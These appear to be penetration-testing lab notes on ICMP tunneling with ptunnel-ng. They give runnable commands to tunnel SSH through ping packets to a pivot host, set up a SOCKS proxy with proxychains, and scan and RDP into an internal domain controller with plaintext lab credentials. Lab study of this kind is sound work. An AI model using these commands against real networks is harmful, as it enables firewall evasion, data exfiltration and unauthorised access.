
## What is ICMP Tunneling?

ICMP Tunneling hides data inside **ICMP Echo Requests/Replies (ping packets)**. This works when outbound ping requests (ICMP traffic) are **allowed by the firewall**, but normal traffic like SSH or HTTP is **blocked**.

- **Goal**: Exfiltrate data or tunnel to internal networks by hiding it in ping packets.

## Tool Used: `ptunnel-ng`

**ptunnel-ng** (next-gen version) lets you:

- Use ICMP as the tunnel transport
- Connect from attacker → pivot → internal DC
- Tunnel SSH or even dynamic SOCKS proxies through ping packets

## Scenario

- **Attacker IP**: `10.10.14.18`
- **Pivot Host (Ubuntu)**: `10.129.202.64`
- **Internal DC**: `172.16.5.19`
- **Goal**: Get RDP to DC using ICMP tunnel → SSH dynamic forward → Proxychains

## 1️⃣ Clone ptunnel-ng (on Attacker)
```bash
git clone https://github.com/utoni/ptunnel-ng.git
cd ptunnel-ng
sudo apt install automake autoconf -y
sudo ./autogen.sh   # OR build a static binary with:
sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j4 all/' autogen.sh
sudo ./autogen.sh
```

## 2️⃣ Transfer to Pivot Host

```bash
scp -r ptunnel-ng ubuntu@10.129.202.64:~/
```

## 3️⃣ Run ptunnel-ng Server (on Pivot Host)

```bash
cd ptunnel-ng/src
sudo ./ptunnel-ng -r10.129.202.64 -R22
```

- `-r`: Target IP (itself)
- `-R`: Remote port to open (22 for SSH)

## 4️⃣ Run ptunnel-ng Client (on Attacker)

```bash
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
```

- `-p`: Remote (pivot) IP
- `-l`: Local port (for example, 2222 on attacker)
- This sets up:  
    `127.0.0.1:2222 → ICMP → 10.129.202.64:22`

## 5️⃣ SSH Through ICMP Tunnel

```bash
ssh -p2222 -lubuntu 127.0.0.1
```

___
# Add Dynamic Port Forwarding

Once inside, run:
```bash
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```
This creates a **SOCKS5 proxy on port 9050**, usable with proxychains.
### Configure Proxychains
Edit `/etc/proxychains.conf`:
```bash
[ProxyList]
socks5 127.0.0.1 9050
```

## RDP into the Internal DC
```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123

#OR SCAN FIRST
proxychains nmap -sT -sV 172.16.5.19 -p3389
```

